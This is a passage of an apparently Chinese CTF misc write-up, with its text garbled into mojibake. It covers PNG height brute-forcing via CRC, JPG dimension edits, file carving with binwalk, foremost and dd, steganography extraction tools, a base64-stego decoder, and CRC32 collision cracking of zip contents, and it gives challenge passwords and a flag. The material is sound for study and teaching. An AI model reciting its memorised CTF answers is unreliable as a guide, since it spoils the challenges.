class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br>misc = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctfshow.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-comment">#print(misc[0x0c:0x0f+1])</span><br><span class="hljs-comment"># çˆ†ç ´é«˜</span><br><br>crc32_bytes = misc[<span class="hljs-number">0x1d</span>:<span class="hljs-number">0x20</span>+<span class="hljs-number">1</span>]<span class="hljs-comment"># è¯»å‡ºbytes</span><br>crc32_hex_eval = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;0x&#x27;</span> + crc32_bytes.<span class="hljs-built_in">hex</span>())<span class="hljs-comment">#bytesä¸² -&gt; hexä¸²  -&gt;  å€¼</span><br>print(crc32_hex_eval)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4096</span>):<br>    data = misc[<span class="hljs-number">0x0c</span>:<span class="hljs-number">0x0f</span>+<span class="hljs-number">1</span>] + misc[<span class="hljs-number">0x10</span>:<span class="hljs-number">0x13</span>+<span class="hljs-number">1</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="hljs-number">0x18</span>:<span class="hljs-number">0x1c</span>+<span class="hljs-number">1</span>]  <span class="hljs-comment">#IHDRæ•°æ®</span><br>    crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">if</span> crc32 == crc32_hex_eval : <span class="hljs-comment">#IHDRå—çš„crc32å€¼</span><br>        print(i)<br>        print(<span class="hljs-string">&quot;height_hex:&quot;</span>+ <span class="hljs-built_in">hex</span>(i))<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">2871077429<br>1463<br>height_hex:0x5b7<br><br></code></pre></td></tr></table></figure><h3 id="JPGæ ¼å¼"><a href="#JPGæ ¼å¼" class="headerlink" title="JPGæ ¼å¼"></a>JPGæ ¼å¼</h3><p> æ‰“å¼€å›¾ç‰‡ï¼Œæœç´¢<code>FFC0</code>ï¼Œåœ¨001180 åé¢4ä¸ªå­—èŠ‚åˆ†åˆ«æ˜¯æ˜¯é«˜å®½ï¼ŒæŠŠ00 80æ”¹æˆ02 80<br><img src="https://img-blog.csdnimg.cn/2020120309412773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="PNGæ ¼å¼"><a href="#PNGæ ¼å¼" class="headerlink" title="PNGæ ¼å¼"></a>PNGæ ¼å¼</h3><blockquote><p>ç¬¬äºŒè¡Œå‰å››ä½è¡¨ç¤ºå›¾ç‰‡çš„å®½ï¼Œåå››ä½è¡¨ç¤ºå›¾ç‰‡çš„é«˜ã€‚</p></blockquote><p>åå…­è¿›åˆ¶çš„045Fä¸ºåè¿›åˆ¶çš„1119ï¼Œåå…­è¿›åˆ¶çš„200ä¸ºåè¿›åˆ¶çš„512<br>å‘ç°åƒç´ å¤§å°ä¸å±æ€§ä¸€è‡´ï¼Œäºæ˜¯æŠŠé«˜è·Ÿå®½æ”¹æˆåŒä¸€å¤§å°ä¿å­˜æ•°æ®ã€‚<img src="https://img-blog.csdnimg.cn/20200404131749174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="12-æ–‡ä»¶åˆ†ç¦»"><a href="#12-æ–‡ä»¶åˆ†ç¦»" class="headerlink" title="12. æ–‡ä»¶åˆ†ç¦»"></a>12. æ–‡ä»¶åˆ†ç¦»</h2><h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><p>ä½¿ç”¨foremostå‘½ä»¤<code>foremost 1.jpg</code><br><img src="https://img-blog.csdnimg.cn/20210210181059208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/20210210181142925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¸¦<code>-T</code>å‚æ•°ï¼Œ<code>foremost -T 1.jpg</code>ä¼šç”Ÿæˆä»¥æ—¶é—´ä¸ºåçš„æ–‡ä»¶å¤¹åå­—ï¼Œå¯ä»¥é¿å…é‡å¤<br><img src="https://img-blog.csdnimg.cn/20210210181751114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>binwalkä¸€ä¸‹ï¼Œå‘ç°æœ‰éšè—æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20201220185035492.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ†ç¦»æ–‡ä»¶ï¼Œåˆ†ç¦»å‡º1B377.rar<br><img src="https://img-blog.csdnimg.cn/20201220152556319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ddå‘½ä»¤"><a href="#ddå‘½ä»¤" class="headerlink" title="ddå‘½ä»¤"></a>ddå‘½ä»¤</h3><p>binwalkå›¾ç‰‡åå¾—åˆ°çš„ä¿¡æ¯ï¼Œjpegæ–‡ä»¶æ˜¯ä»271007å¼€å§‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€$ dd <span class="hljs-keyword">if</span>=binwalk,foremost,dd.png of=out.jpg bs=1 skip=271007<br>è®°å½•äº†29053+0 çš„è¯»å…¥<br>è®°å½•äº†29053+0 çš„å†™å‡º<br>29053å­—èŠ‚ï¼ˆ29 kBï¼Œ28 KiBï¼‰å·²å¤åˆ¶ï¼Œ0.175658 sï¼Œ165 kB/s<br></code></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°pngå›¾ç‰‡</p><h2 id="13-éšè—æ–‡ä»¶åŠ å¯†"><a href="#13-éšè—æ–‡ä»¶åŠ å¯†" class="headerlink" title="13. éšè—æ–‡ä»¶åŠ å¯†"></a>13. éšè—æ–‡ä»¶åŠ å¯†</h2><h3 id="F5éšå†™"><a href="#F5éšå†™" class="headerlink" title="F5éšå†™"></a>F5éšå†™</h3><p>éœ€è¦javaç¯å¢ƒï¼Œè¿›å…¥F5-steganography/ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java Extract Matryoshka.jpg -p <span class="hljs-string">&#x27;!LyJJ9bi&amp;M7E72*JyD&#x27;</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆout.txt<br><img src="https://img-blog.csdnimg.cn/20210215143718300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h3><p>è¿›å…¥ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf 01.jpg -p A7SL9nHRJXLh@<span class="hljs-variable">$EbE8</span> <br></code></pre></td></tr></table></figure><p>ç”Ÿæˆpwd.txt<br><img src="https://img-blog.csdnimg.cn/20210215150108852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><p>è¿›å…¥ç›®å½•ä¸‹ï¼Œéœ€è¦æ–°å»ºä¸€ä¸ªtxtæ–‡æ¡£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">outguess -k <span class="hljs-string">&quot;z0GFieYAee%gdf0%lF&quot;</span> -r 02.jpg flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210215150728680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="JPHS"><a href="#JPHS" class="headerlink" title="JPHS"></a>JPHS</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/drondong/article/details/79326385">https://blog.csdn.net/drondong/article/details/79326385</a><br>åªèƒ½æ‰“å¼€jpgæ ¼å¼çš„å›¾ç‰‡ï¼Œè¾“å…¥ä¸¤æ¬¡ç›¸åŒå¯†ç ï¼Œæå–éšè—æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20210215152800344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="cloacked-pixel"><a href="#cloacked-pixel" class="headerlink" title="cloacked-pixel"></a>cloacked-pixel</h3><p><strong>cloacked-pixelå®‰è£…</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://codechina.csdn.net/mirrors/cyberinc/cloacked-pixel.git<br></code></pre></td></tr></table></figure><p>å®‰è£…éœ€è¦ç”¨åˆ°çš„åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install numpy-1.16.6+mkl-cp27-cp27m-win_amd64.whl<br>pip install matplotlib<br>pip install pillow<br><span class="hljs-comment">#å¸è½½é™ˆæ—§ç‰ˆæœ¬çš„åŒ…</span><br>pip uninstall crypto<br>pip uninstall pycrypto<br><span class="hljs-comment">#å®‰è£…æ–°ç‰ˆæœ¬</span><br>pip install pycryptodome<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">E:\cloacked-pixel&gt;python lsb.py extract lsbï¼ˆ123456ï¼‰.png flag.txt 123456<br>[+] Image size: 640x640 pixels.<br>[+] Written extracted data to flag.txt.<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319223117700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="14-æå–ç”µè¯æ‹¨å·éŸ³"><a href="#14-æå–ç”µè¯æ‹¨å·éŸ³" class="headerlink" title="14. æå–ç”µè¯æ‹¨å·éŸ³"></a>14. æå–ç”µè¯æ‹¨å·éŸ³</h2><p>å·¥å…·ä¸‹è½½åœ°å€ï¼š<a href="https://www.cr173.com/soft/17040.html">https://www.cr173.com/soft/17040.html</a><br><img src="https://img-blog.csdnimg.cn/20210209221414910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="15-Base64éšå†™"><a href="#15-Base64éšå†™" class="headerlink" title="15. Base64éšå†™"></a>15. Base64éšå†™</h2><p><strong>[GXYCTF2019]SXMgdGhpcyBiYXNlPw=</strong></p><p>æ‰“å¼€æ–‡ä»¶æ˜¯å¤šè¡Œbase64å¯†æ–‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">Q2V0dGUgbnVpdCwK<br>SW50ZW5hYmxlIGluc29tbmllLAp=<br>TGEgZm9saWUgbWUgZ3VldHRlLAo=<br>SmUgc3VpcyBjZSBxdWUgamUgZnVpcwp=<br>SmUgc3ViaXMsCt==<br>Q2V0dGUgY2Fjb3Bob25pZSwK<br>UXVpIG1lIHNjaWUgbGEgdOmUmnRlLAp=<br>QXNzb21tYW50ZSBoYXJtb25pZSwK<br>RWxsZSBtZSBkaXQsCo==<br>VHUgcGFpZXJhcyB0ZXMgZGVsaXRzLAp=<br>UXVvaSBxdSdpbCBhZHZpZW5uZSwK<br>T24gdHJh5Y2vbmUgc2VzIGNoYeWNr25lcywK<br>U2VzIHBlaW5lcywK<br>SmUgdm91ZSBtZXMgbnVpdHMsCm==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCl==<br>QXV4IHJlcXVpZW1zLAr=<br>VHVhbnQgcGFyIGRlcGl0LAq=<br>Q2UgcXVlIGplIHNlbWUsCt==<br>SmUgdm91ZSBtZXMgbnVpdHMsCp==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCp==<br>RXQgYXV4IGJsYXNwaGVtZXMsCo==<br>Sidhdm91ZSBqZSBtYXVkaXMsCl==<br>VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK<br>TCdlbm5lbWksCu==<br>VGFwaSBkYW5zIG1vbiBlc3ByaXQsCp==<br>RumUmnRlIG1lcyBkZWZhaXRlcywK<br>U2FucyByZXBpdCBtZSBkZWZpZSwK<br>SmUgcmVuaWUsCq==<br>TGEgZmF0YWxlIGhlcmVzaWUsCh==<br>UXVpIHJvbmdlIG1vbiDplJp0cmUsCo==<br>SmUgdmV1eCByZW5h5Y2vdHJlLAp=<br>UmVuYeWNr3RyZSwK<br>SmUgdm91ZSBtZXMgbnVpdHMsCn==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCq==<br>QXV4IHJlcXVpZW1zLAp=<br>VHVhbnQgcGFyIGRlcGl0LAq=<br>Q2UgcXVlIGplIHNlbWUsCo==<br>SmUgdm91ZSBtZXMgbnVpdHMsCm==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCl==<br>RXQgYXV4IGJsYXNwaGVtZXMsCm==<br>Sidhdm91ZSBqZSBtYXVkaXMsCu==<br>VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK<br>UGxldXJlbnQgbGVzIHZpb2xvbnMgZGUgbWEgdmllLAp=<br>TGEgdmlvbGVuY2UgZGUgbWVzIGVudmllcywK<br>U2lwaG9ubmVlIHN5bXBob25pZSwK<br>RGVjb25jZXJ0YW50IGNvbmNlcnRvLAq=<br>SmUgam91ZSBzYW5zIHRvdWNoZXIgbGUgRG8sCo==<br>TW9uIHRhbGVudCBzb25uZSBmYXV4LAp=<br>SmUgbm9pZSBtb24gZW5udWksCo==<br>RGFucyBsYSBtZWxvbWFuaWUsCl==<br>SmUgdHVlIG1lcyBwaG9iaWVzLAq=<br>RGFucyBsYSBkZXNoYXJtb25pZSwK<br>SmUgdm91ZSBtZXMgbnVpdHMsCv==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCn==<br>QXV4IHJlcXVpZW1zLAp=<br>VHVhbnQgcGFyIGRlcGl0LAo=<br>Q2UgcXVlIGplIHNlbWUsCm==<br>SmUgdm91ZSBtZXMgbnVpdHMsCp==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCm==<br>RXQgYXV4IGJsYXNwaGVtZXMsCu==<br>Sidhdm91ZSBqZSBtYXVkaXMsCm==<br>VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK<br>SmUgdm91ZSBtZXMgbnVpdHMsCn==<br>QSBsJ2Fzc2FzeW1waG9uaWUgKGwnYXNzYXN5bXBob25pZSksCn==<br>Sidhdm91ZSBqZSBtYXVkaXMsCt==<br>VG91cyBjZXV4IHF1aSBzJ2FpbWVudA==<br></code></pre></td></tr></table></figure><p>è„šæœ¬1ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-comment">#no equalnum no offset</span><br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]) <br></code></pre></td></tr></table></figure><p>è„šæœ¬2ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_base64_diff_value</span>(<span class="hljs-params">s1, s2</span>):</span><br>    base64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(s2)):<br>        <span class="hljs-keyword">if</span> s1[i] != s2[i]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_stego</span>():</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_lines = f.readlines()<br>        bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_lines:<br>            steg_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            norm_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            diff = get_base64_diff_value(steg_line, norm_line)<br>            <span class="hljs-built_in">print</span> diff<br>            pads_num = steg_line.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            <span class="hljs-keyword">if</span> diff:<br>                bin_str += <span class="hljs-built_in">bin</span>(diff)[<span class="hljs-number">2</span>:].zfill(pads_num * <span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">else</span>:<br>                bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * pads_num * <span class="hljs-number">2</span><br>            <span class="hljs-built_in">print</span> goflag(bin_str)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">goflag</span>(<span class="hljs-params">bin_str</span>):</span><br>    res_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>):<br>        res_str += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res_str<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve_stego()<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GXY&#123;fazhazhenhaoting&#125;<br></code></pre></td></tr></table></figure><h2 id="16-CRCç¢°æ’"><a href="#16-CRCç¢°æ’" class="headerlink" title="16. CRCç¢°æ’"></a>16. CRCç¢°æ’</h2><p>ä¸‹è½½é™„ä»¶ï¼Œéƒ½æ˜¯å‹ç¼©åŒ…<br><img src="https://img-blog.csdnimg.cn/20201220185929452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>CRCç¢°æ’ï¼Œæ ¹æ®å½©è™¹æ’åºé¢œè‰²æ’åºï¼Œçº¢æ©™é»„ç»¿é’ï¼ŒCRC32å€¼åˆ†åˆ«ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">çº¢ <span class="hljs-number">555</span>FA1A2<br>æ©™ E5C67F46  <br>é»„ <span class="hljs-number">6E957</span>E45<br>ç»¿ <span class="hljs-number">76</span>D6A31A<br>é’ <span class="hljs-number">2</span>B042586<br></code></pre></td></tr></table></figure><p>è¡¥å……ä¸Š0xå¼€å¤´ï¼Œä½¿ç”¨è„šæœ¬è¿›è¡Œç¢°æ’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br>dic=string.printable  <br>crc1 = <span class="hljs-number">0xe5c67f46</span>  <br>crc2 = <span class="hljs-number">0x555fa1a2</span><br>crc3 = <span class="hljs-number">0x6e957e45</span><br>crc4 = <span class="hljs-number">0x76d6a31a</span><br>crc5 = <span class="hljs-number">0x2b042586</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CrackCrc4</span>(<span class="hljs-params">crc</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic :<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> dic:<br>                <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> dic:<br>                        s=i+j+p+q<br>                        <span class="hljs-keyword">if</span> crc == (binascii.crc32(s.encode(<span class="hljs-string">&quot;ascii&quot;</span>))):<br>                            <span class="hljs-built_in">print</span> (s)<br>                            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>CrackCrc4(crc1)<br>CrackCrc4(crc2)<br>CrackCrc4(crc3)<br>CrackCrc4(crc4)<br>CrackCrc4(crc5)<br></code></pre></td></tr></table></figure><p>è„šæœ¬è·‘å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 